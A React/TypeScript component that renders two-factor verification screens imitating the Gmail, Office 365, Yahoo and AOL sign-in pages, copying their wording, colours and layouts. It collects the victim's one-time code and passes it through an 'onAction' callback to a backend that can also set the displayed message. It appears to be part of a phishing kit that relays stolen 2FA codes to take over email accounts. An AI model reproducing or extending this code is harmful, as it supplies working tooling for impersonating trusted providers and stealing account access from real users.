import React, { useState } from 'react';
import { useLocation } from 'react-router-dom';
import { ProviderKey, getProviderTheme } from './providerTheme';
import ProviderShell from './ProviderShell';

interface TwoFactorPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const TwoFactorPage: React.FC<TwoFactorPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const appName = (data.appName as string) || 'your authenticator app';
  const backendMessage = (data.message as string) || '';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const headline: Record<ProviderKey, string> = {
    gmail: '2-Step Verification',
    office365: 'Enter code',
    yahoo: 'Verify your identity',
    aol: 'Two-step verification',
    others: 'Two-factor authentication',
  };

  const description =
    backendMessage || `Open ${appName} and enter the 6-digit verification code for your account.`;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_2fa', { code });
  };
  const tryAnotherWay = () => onAction('request_alternate_method', { email });
  const goBack = () => {
    onAction('user_canceled');
  };

  // Provider-styled input element.
  const renderInput = () => {
    if (providerKey === 'gmail') {
      return (
        <>
          <h2 className="text-[18px] text-gray-900 font-normal mb-2">
            Enter the code from your authenticator app
          </h2>
          <label className="block text-xs text-gray-600 mb-1 mt-4">Verification code</label>
          <input
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
            maxLength={8}
            autoFocus
            className="w-full px-3 py-3 text-lg tracking-[0.4em] border border-gray-400 rounded-md outline-none focus:border-blue-600 focus:border-2"
          />
        </>
      );
    }
    if (providerKey === 'office365') {
      return (
        <input
          type="tel"
          inputMode="numeric"
          autoComplete="one-time-code"
          placeholder="Code"
          value={code}
          onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
          maxLength={8}
          autoFocus
          className="w-full px-2 py-1 text-[15px] border-0 border-b-2 bg-transparent outline-none focus:border-[#0067b8]"
          style={{ borderBottomColor: '#666' }}
        />
      );
    }
    if (providerKey === 'yahoo') {
      return (
        <>
          <label className="block text-xs text-gray-600">Verification code</label>
          <input
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
            maxLength={8}
            autoFocus
            className="w-full border-b pt-2 pb-2 text-base tracking-[0.3em] focus:outline-none"
            style={{ borderColor: '#dcdfe0' }}
          />
        </>
      );
    }
    if (providerKey === 'aol') {
      return (
        <input
          type="tel"
          inputMode="numeric"
          autoComplete="one-time-code"
          placeholder="Enter code"
          value={code}
          onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
          maxLength={8}
          autoFocus
          className="w-full border-b pt-2 pb-2 text-base tracking-[0.25em] focus:outline-none"
          style={{ borderColor: '#dcdfe0' }}
        />
      );
    }
    return (
      <input
        type="tel"
        inputMode="numeric"
        autoComplete="one-time-code"
        placeholder="123456"
        value={code}
        onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
        maxLength={8}
        autoFocus
        className="w-full px-4 py-3 text-center text-lg tracking-[0.4em] border rounded-md outline-none focus:border-[#0066cc]"
        style={{ borderColor: '#d1d1d1' }}
      />
    );
  };

  let primaryActions: React.ReactNode;
  let secondaryAction: React.ReactNode;
  if (providerKey === 'gmail') {
    primaryActions = (
      <button
        type="submit"
        form="tfa-form"
        disabled={code.length < 6 || submitting}
        className="px-6 py-2.5 text-white text-sm font-semibold rounded-full disabled:opacity-50"
        style={{ backgroundColor: theme.primary }}
      >
        {submitting ? 'Verifying\u2026' : 'Next'}
      </button>
    );
    secondaryAction = (
      <button
        type="button"
        onClick={tryAnotherWay}
        className="text-sm font-semibold hover:underline"
        style={{ color: theme.primary }}
      >
        Try another way
      </button>
    );
  } else if (providerKey === 'office365') {
    primaryActions = (
      <button
        type="submit"
        form="tfa-form"
        disabled={code.length < 6 || submitting}
        className="px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60"
        style={{ backgroundColor: theme.primary, minWidth: '108px' }}
      >
        {submitting ? 'Verifying\u2026' : 'Verify'}
      </button>
    );
    secondaryAction = (
      <>
        <button
          type="button"
          onClick={tryAnotherWay}
          className="text-sm text-[#0067b8] hover:underline text-left w-fit"
        >
          Sign in another way
        </button>
        <button
          type="button"
          onClick={() => onAction('more_info')}
          className="text-sm text-[#0067b8] hover:underline text-left w-fit"
        >
          More information
        </button>
      </>
    );
  } else {
    primaryActions = (
      <button
        type="submit"
        form="tfa-form"
        disabled={code.length < 6 || submitting}
        className={
          providerKey === 'aol'
            ? 'w-full py-3 text-white font-bold rounded-md text-base disabled:opacity-50'
            : providerKey === 'yahoo'
              ? 'w-full py-3 text-white font-medium rounded-full disabled:opacity-60'
              : 'w-full py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60'
        }
        style={{ backgroundColor: theme.primary }}
      >
        {submitting ? 'Verifying\u2026' : 'Verify'}
      </button>
    );
    secondaryAction = (
      <>
        <button
          type="button"
          onClick={tryAnotherWay}
          className="hover:underline font-medium"
          style={{ color: theme.primary }}
        >
          Try another way
        </button>
        <button
          type="button"
          onClick={goBack}
          className="hover:underline font-medium"
          style={{ color: theme.primary }}
        >
          Cancel
        </button>
      </>
    );
  }

  return (
    <ProviderShell
      providerKey={providerKey}
      email={email}
      title={headline[providerKey]}
      description={description}
      onBack={goBack}
      primaryActions={primaryActions}
      secondaryAction={secondaryAction}
    >
      <form id="tfa-form" onSubmit={handleSubmit}>{renderInput()}</form>
    </ProviderShell>
  );
};

export default TwoFactorPage;
